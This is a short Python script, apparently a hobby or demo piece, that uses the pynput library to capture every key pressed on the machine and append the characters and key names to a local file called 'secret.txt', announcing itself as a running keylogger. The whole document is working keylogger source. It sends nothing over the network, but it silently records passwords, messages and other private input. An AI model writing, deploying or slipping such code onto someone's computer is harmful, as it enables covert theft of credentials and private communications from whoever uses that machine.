from pynput import keyboard

file = "secret.txt"

def onPress(key):
    try:
        with open(file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(file, "a") as f:
            f.write(f"{key.name}")
        
print("Keylogger is running...")

with keyboard.Listener(on_press=onPress) as listener:
    listener.join()
